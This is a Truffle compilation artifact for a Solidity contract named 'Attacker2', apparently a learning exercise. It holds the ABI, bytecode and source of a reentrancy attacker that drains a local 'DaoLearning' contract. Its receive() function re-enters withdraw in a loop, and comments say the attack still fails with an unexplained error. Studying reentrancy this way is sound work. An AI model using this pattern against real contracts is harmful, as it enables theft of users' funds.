{
  "contractName": "Attacker2",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "receive",
      "payable": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "addr",
          "type": "address"
        }
      ],
      "name": "initializeDao",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "depositToDao",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "myDaoBalance",
      "outputs": [
        {
          "internalType": "uint64",
          "name": "",
          "type": "uint64"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "withdrawFromDao",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405260008060006101000a81548167ffffffffffffffff021916908367ffffffffffffffff1602179055506000600160146101000a81548160ff02191690831515021790555034801561005457600080fd5b5033600060086101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610630806100a56000396000f3fe60806040526004361061004e5760003560e01c80632f7b73de1461015a57806331c3831014610183578063341b44e1146101ae5780635e286c7b146101b85780639e5faafc146101cf57610155565b3661015557600160149054906101000a900460ff16801561009857506103fc67ffffffffffffffff1660008054906101000a900467ffffffffffffffff1667ffffffffffffffff16105b156101535760008081819054906101000a900467ffffffffffffffff16809291906100c290610479565b91906101000a81548167ffffffffffffffff021916908367ffffffffffffffff1602179055505034600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163110610136576101316101e6565b610152565b6000600160146101000a81548160ff0219169083151502179055505b5b005b600080fd5b34801561016657600080fd5b50610181600480360381019061017c919061050c565b61027c565b005b34801561018f57600080fd5b506101986102c0565b6040516101a59190610548565b60405180910390f35b6101b6610358565b005b3480156101c457600080fd5b506101cd6101e6565b005b3480156101db57600080fd5b506101e46103e9565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663750f0acc61022c6102c0565b6040518263ffffffff1660e01b81526004016102489190610548565b600060405180830381600087803b15801561026257600080fd5b505af1158015610276573d6000803e3d6000fd5b50505050565b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c71daccb6040518163ffffffff1660e01b8152600401602060405180830381865afa15801561032f573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610353919061058f565b905090565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663eeb9635c6001346103a391906105c6565b6040518263ffffffff1660e01b81526004016000604051808303818588803b1580156103ce57600080fd5b505af11580156103e2573d6000803e3d6000fd5b5050505050565b60018060146101000a81548160ff02191690831515021790555060016000806101000a81548167ffffffffffffffff021916908367ffffffffffffffff1602179055506104346101e6565b565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600067ffffffffffffffff82169050919050565b600061048482610465565b915067ffffffffffffffff820361049e5761049d610436565b5b600182019050919050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006104d9826104ae565b9050919050565b6104e9816104ce565b81146104f457600080fd5b50565b600081359050610506816104e0565b92915050565b600060208284031215610522576105216104a9565b5b6000610530848285016104f7565b91505092915050565b61054281610465565b82525050565b600060208201905061055d6000830184610539565b92915050565b61056c81610465565b811461057757600080fd5b50565b60008151905061058981610563565b92915050565b6000602082840312156105a5576105a46104a9565b5b60006105b38482850161057a565b91505092915050565b6000819050919050565b60006105d1826105bc565b91506105dc836105bc565b9250828210156105ef576105ee610436565b5b82820390509291505056fea26469706673582212200e73f255900709c80e5374354598c90c427789df6459fc055fa1de5beea68d4564736f6c634300080e0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: UNLICENSED\r\n\r\npragma solidity >=0.7.0 <0.9.0;\r\n\r\nimport \"./DaoLearning.sol\";\r\n\r\n//Test contract to demonstrate a Reentrancy attack\r\n//While it is structured better than AttackerContract.sol, the same\r\n//unknown problem persists when an attack is initiated (see below)\r\n\r\n\r\n//Note: The problem is due to some unknown error that triggers a jump\r\n//to invalid address on purpose from the EVM to force an out-of-gas\r\n//error.  The base problem is not known yet, but it isn't the gas limit\r\n\r\n//Also, the loop limit and iteration variables are to make sure that the\r\n//stack doesn't reach 1024, which is the stack limit in the EVM\r\n//      Built on a misconception!  This does not apply to the stack limit in the EVM\r\ncontract Attacker2 {\r\n\r\n    uint64 constant internal ATTACK_LOOP_LIMIT = 1020;\r\n    uint64 internal current_iteration = 0;\r\n\r\n    //Instantiate the owner's address, and the contract to be attacked\r\n    address payable owner;\r\n    DaoLearning dao;\r\n\r\n    //Whether the contract is attacking (as opposed to withdrawing normally)\r\n    bool attacking = false;\r\n\r\n    //Constructs this attacker, saving the owner to a variable\r\n    constructor() {\r\n        owner = payable(msg.sender);\r\n    }\r\n\r\n    //Initialize the DAO contract variable with it's address\r\n    function initializeDao(address addr) public {\r\n        dao = DaoLearning(addr);\r\n    }\r\n\r\n    //Deposit money onto this contract's account with the DAO\r\n    function depositToDao() public payable {\r\n        dao.mintTokens{value: msg.value-1}();\r\n    }\r\n\r\n    //Check this contract's balance with the DAO\r\n    function myDaoBalance() public view returns (uint64) {\r\n        return dao.checkBalance();\r\n    }\r\n\r\n    //Withdraw the money stored with the DAO back to this contract\r\n    function withdrawFromDao() public {\r\n        dao.withdraw(myDaoBalance());\r\n    }\r\n\r\n    //Begins a withdrawl from the DAO, with the bool that triggers recursion\r\n    function attack() public {\r\n        attacking = true;\r\n        current_iteration = 1;\r\n        withdrawFromDao();\r\n    }\r\n\r\n    //Receive function, which acts as normal until \"attacking\" is set to true\r\n    receive() external payable {\r\n        //If the contract is attacking right now\r\n        if (attacking && current_iteration < ATTACK_LOOP_LIMIT) {\r\n            current_iteration++;\r\n            //Check to see if the DAO still has more money to take\r\n            if (address(dao).balance >= msg.value) {\r\n                //If so, take more\r\n                withdrawFromDao();\r\n            } else {\r\n                //If not, stop taking, and allow the call stack to close\r\n                attacking = false;\r\n            }\r\n        }\r\n    }\r\n\r\n}",
  "sourcePath": "C:\\Users\\mbwil\\Documents\\Programming\\Solidity\\Truffle\\FirstProject\\contracts\\Attacker2.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.14+commit.80d49f37.Emscripten.clang"
  },
  "schemaVersion": "3.4.7",
  "updatedAt": "2022-06-23T02:38:38.035Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}